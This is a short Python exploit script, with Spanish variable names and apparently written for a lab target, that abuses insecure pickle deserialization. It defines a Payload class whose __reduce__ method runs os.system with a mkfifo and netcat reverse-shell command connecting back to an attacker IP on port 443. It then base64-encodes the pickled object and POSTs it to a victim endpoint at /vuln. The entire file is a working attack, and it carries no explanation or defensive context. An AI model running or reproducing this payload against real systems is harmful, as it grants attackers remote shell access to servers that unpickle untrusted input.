#!/usr/bin/python3

import pickle
import base64
import os
import requests

ip_atacante = "192.168.86.229"
puerto_atacante = 443

url_victima = "http://192.168.86.44:5000/vuln"

class Payload:
	def __reduce__(self):
		cmd = "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+ ip_atacante +" " + str(puerto_atacante) + " >/tmp/f"
		return os.system, (cmd, )

payload_object = Payload()

pickled = pickle.dumps(payload_object) # son bits

datos = {
	"pickled": base64.urlsafe_b64encode(pickled)
}

requests.post(url_victima, data = datos)

